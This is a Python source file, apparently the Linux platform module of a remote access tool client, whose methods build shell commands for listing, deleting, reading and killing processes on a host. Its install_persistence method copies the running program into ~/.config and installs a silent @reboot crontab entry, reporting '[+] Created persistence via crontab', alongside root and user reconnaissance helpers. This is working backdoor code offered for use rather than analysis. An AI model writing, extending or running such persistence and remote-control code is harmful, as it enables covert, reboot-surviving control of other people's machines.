import os
import subprocess
import shutil
import sys

from client.platform.base import AbstractPlatform


class LinuxPlatform(AbstractPlatform):

    def list_dir_cmd(self, path=None):
        return f'ls -la "{path}"' if path else 'ls -la'

    def current_dir_cmd(self):
        return 'pwd'

    def delete_cmd(self, path, recursive=False):
        if recursive:
            return f'rm -rf "{path}"'
        return f'rm -f "{path}"'

    def move_cmd(self, src, dst):
        return f'mv "{src}" "{dst}"'

    def read_file_cmd(self, path):
        return f'cat "{path}"'

    def touch_cmd(self, path):
        return f'touch "{path}"'

    def process_list_cmd(self):
        return 'ps aux'

    def kill_process_cmd(self, pid):
        return f'kill -9 {pid}'

    def pkill_cmd(self, name):
        return f'pkill {name}'

    def network_info_cmd(self):
        return 'ifconfig'

    def install_persistence(self, reg_name, copy_name):
        try:
            dest_dir = os.path.expanduser(f'~/.config')
            os.makedirs(dest_dir, exist_ok=True)
            client_path = os.path.join(dest_dir, copy_name)

            if getattr(sys, 'frozen', False):
                shutil.copyfile(sys.executable, client_path)
                os.chmod(client_path, 0o755)
                cron_cmd = f'{client_path}'
            else:
                script_path = os.path.abspath(sys.argv[0])
                if os.path.isdir(script_path):
                    script_path = os.path.join(script_path, '__main__.py')
                shutil.copyfile(script_path, client_path)
                cron_cmd = f'{sys.executable} {client_path}'

            cron_line = f'@reboot {cron_cmd} >/dev/null 2>&1\n'
            cron_path = os.path.join(dest_dir, 'crontab_entry')
            with open(cron_path, 'w') as f:
                f.write(cron_line)
            subprocess.call(f'crontab {cron_path}', shell=True)
            os.remove(cron_path)
            return '[+] Created persistence via crontab'
        except Exception as e:
            return f'[-] Persistence error: {e}'

    def get_appdata_path(self):
        return os.path.expanduser('~/.config')

    def check_admin(self):
        return '[+] Root' if os.geteuid() == 0 else '[-] Not root'

    def get_system_user(self):
        try:
            return os.getlogin()
        except Exception:
            return os.environ.get('USER', 'Unknown')

    def get_memory_info(self):
        try:
            with open('/proc/meminfo', 'r') as f:
                for line in f:
                    if line.startswith('MemTotal:'):
                        kb = int(line.split()[1])
                        gb = round(kb / (1024 ** 2), 2)
                        return f"Total RAM: {gb} GB"
        except Exception:
            pass
        return None

    def grep_cmd(self, pattern):
        return f'grep -r "{pattern}" .'

    def clear_screen_cmd(self):
        return 'clear'
